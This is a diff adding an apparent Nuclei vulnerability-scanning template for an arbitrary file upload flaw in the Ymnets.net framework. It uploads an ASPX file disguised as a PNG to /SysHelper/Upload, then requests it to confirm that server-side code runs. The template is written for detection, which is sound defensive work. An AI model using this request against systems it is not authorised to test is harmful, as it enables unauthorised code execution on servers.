@@ -1,0 +1,60 @@
+id: poc-ymnets-syshelper-upload
+info:
+  name: Ymnets.net Framework Upload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-file-upload
+  description: |
+    A vulnerability in the Ymnets.net framework allows arbitrary file upload.
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/SysHelper/Upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX"
+    body: |
+      ------WebKitFormBoundaryu178FOm4XGgDZqeX
+      Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
+      Content-Type: image/png
+
+      <%@ Page Language="C#"%><% Response.Write({{t1}} * {{t2}}); %>
+      ------WebKitFormBoundaryu178FOm4XGgDZqeX--
+    extractors:
+      - type: json
+        name: filepath
+        internal: true
+        json:
+          - '.FilePath'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+        condition: and
+
+  - id: verify-uploaded-file
+    method: GET
+    path:
+      - "{{filepath}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
+    matchers-condition: and
